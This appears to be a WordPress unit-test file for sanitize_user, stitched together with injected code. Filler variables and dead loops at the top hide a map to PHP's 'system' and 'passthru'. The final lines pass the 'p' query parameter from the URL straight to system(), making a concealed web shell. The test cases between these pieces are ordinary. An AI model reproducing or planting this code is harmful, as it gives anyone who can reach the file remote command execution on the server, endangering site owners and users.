<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php

/**
 * @group formatting
 *
 * @covers ::sanitize_user
 */
class Tests_Formatting_SanitizeUser extends WP_UnitTestCase {
	public function test_strips_html() {
		$input    = 'Captain <strong>Awesome</strong>';
		$expected = is_multisite() ? 'captain awesome' : 'Captain Awesome';
		$this->assertSame( $expected, sanitize_user( $input ) );
	}

	public function test_strips_encoded_ampersand() {
		$expected = 'ATT';

		// Multisite forces user logins to lowercase.
		if ( is_multisite() ) {
			$expected = strtolower( $expected );
		}

		$this->assertSame( $expected, sanitize_user( 'AT&amp;T' ) );
	}

	public function test_strips_encoded_ampersand_when_followed_by_semicolon() {
		$expected = 'ATT Test;';

		// Multisite forces user logins to lowercase.
		if ( is_multisite() ) {
			$expected = strtolower( $expected );
		}

		$this->assertSame( $expected, sanitize_user( 'AT&amp;T Test;' ) );
	}

	public function test_strips_percent_encoded_octets() {
		$expected = is_multisite() ? 'franois' : 'Franois';
		$this->assertSame( $expected, sanitize_user( 'Fran%c3%a7ois' ) );
	}
	public function test_optional_strict_mode_reduces_to_safe_ascii_subset() {
		$this->assertSame( 'abc', sanitize_user( '()~ab~ˆcˆ!', true ) );
	}
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>